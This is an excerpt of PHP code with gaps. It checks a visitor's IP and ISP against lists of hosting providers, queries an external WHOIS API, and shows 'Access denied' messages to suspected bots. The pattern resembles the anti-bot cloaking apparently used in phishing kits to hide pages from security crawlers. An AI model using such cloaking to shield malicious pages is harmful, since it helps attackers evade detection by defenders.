...
'Quasi Networks LTD',
'SC Rusnano ',
'GrameenPhone GoDaddy.com, LLC',
'Server Plan S.r.l.',
'Linode GrameenPhone',
'Blazing SEO GrameenPhone ',
'Lixux OU',
'Inter Connects Inc',
'Flokinet Ltd',
...
$realip =getUserisp();
if (in_array($realip, $bannedIP)):
die('<h2 style="text-align:center; margin:2% auto; color:red;">Access denied!!!</h2><hr>
<div class="row" style="text-align:center;"> <p> Its Look like you are not a human</p></div>
');
endif;
/*=================================================*/
$curl = curl_init();
curl_setopt_array($curl, array(
CURLOPT_URL => 'https://whois.as207111.net/api/lookup?ip_address='.$realip,
...
$current_isp = $user_log['asn']["isp"];
if (in_array($current_isp, $banned_isp)):
die('<h2 style="text-align:center; margin:2% auto; color:red;">Access denied!!!</h2><hr>
<div class="row" style="text-align:center;"> <p> Its Look like you are trying to us Bot.</p></div>
');
endif;
foreach($blocked_words as $word) {
if (substr_count($current_isp, $word) > 0):
die('<h2 style="text-align:center; margin:2% auto; color:red;">Access denied!!!</h2><hr>
<div class="row" style="text-align:center;"> <p> Its look like You are using Bot or Roobot.</p></div>
');
endif;
}